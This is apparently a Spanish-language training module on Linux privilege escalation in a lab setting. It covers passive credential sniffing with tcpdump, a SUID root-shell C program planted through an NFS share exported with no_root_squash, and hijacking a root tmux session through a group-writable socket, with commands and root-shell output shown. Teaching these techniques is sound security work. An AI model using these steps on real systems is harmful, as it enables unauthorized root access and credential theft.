## Passive Traffic Capture

Si `tcpdump` está instalado, los usuarios sin privilegios pueden capturar el tráfico de red, incluyendo, en algunos casos, credenciales que se transmiten en texto claro. Existen varias herramientas, como [net-creds](https://github.com/DanMcInerney/net-creds) y [PCredz](https://github.com/lgandx/PCredz) que se pueden usar para examinar los datos que se transmiten. Esto puede resultar en la captura de información sensible como números de tarjetas de crédito y cadenas de comunidad SNMP. También puede ser posible capturar hashes de Net-NTLMv2, SMBv2 o Kerberos, los cuales podrían ser sometidos a un ataque de fuerza bruta offline para revelar la contraseña en texto claro. Protocolos de texto claro como HTTP, FTP, POP, IMAP, telnet o SMTP pueden contener credenciales que podrían ser reutilizadas para escalar privilegios en el host.

---

## Weak NFS Privileges

Network File System (NFS) permite a los usuarios acceder a archivos o directorios compartidos a través de la red alojados en sistemas Unix/Linux. NFS utiliza el puerto TCP/UDP 2049. Cualquier montaje accesible puede ser listado remotamente emitiendo el comando `showmount -e`, que lista la exportación del servidor NFS (o la lista de control de acceso para sistemas de archivos) que los clientes NFS.

```r
showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Cuando se crea un volumen NFS, se pueden configurar varias opciones:

|Opción|Descripción|
|---|---|
|`root_squash`|Si el usuario root se usa para acceder a las comparticiones NFS, será cambiado al usuario `nfsnobody`, que es una cuenta sin privilegios. Cualquier archivo creado y subido por el usuario root será propiedad del usuario `nfsnobody`, lo cual previene que un atacante suba binarios con el bit SUID establecido.|
|`no_root_squash`|Los usuarios remotos que se conecten a la compartición como el usuario root local podrán crear archivos en el servidor NFS como el usuario root. Esto permitiría la creación de scripts/programas maliciosos con el bit SUID establecido.|

```r
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Por ejemplo, podemos crear un binario SETUID que ejecute `/bin/sh` usando nuestro usuario root local. Luego podemos montar el directorio `/tmp` localmente, copiar el binario propiedad del root al servidor NFS y establecer el bit SUID.

Primero, crea un binario simple, monta el directorio localmente, cópialo y establece los permisos necesarios.

```r
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```r
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```r
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

Cuando volvamos a la sesión de bajo privilegio del host, podemos ejecutar el binario y obtener una shell root.

```r
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```r
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

---

## Hijacking Tmux Sessions

Terminal multiplexers como [tmux](https://en.wikipedia.org/wiki/Tmux) pueden ser usados para permitir múltiples sesiones de terminal sean accesibles dentro de una única sesión de consola. Cuando no estamos trabajando en una ventana `tmux`, podemos desconectarnos de la sesión, dejándola activa (por ejemplo, ejecutando un escaneo `nmap`). Por muchas razones, un usuario puede dejar un proceso `tmux` ejecutándose como un usuario con privilegios, como root configurado con permisos débiles, y puede ser secuestrado. Esto puede hacerse con los siguientes comandos para crear una nueva sesión compartida y modificar la propiedad.

```r
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Si podemos comprometer a un usuario en el grupo `dev`, podemos adjuntarnos a esta sesión y obtener acceso root.

Verifica cualquier proceso `tmux` en ejecución.

```r
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirma los permisos.

```r
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Revisa nuestra membresía en grupos.

```r
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finalmente, adjúntate a la sesión `tmux` y confirma los privilegios root.

```r
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```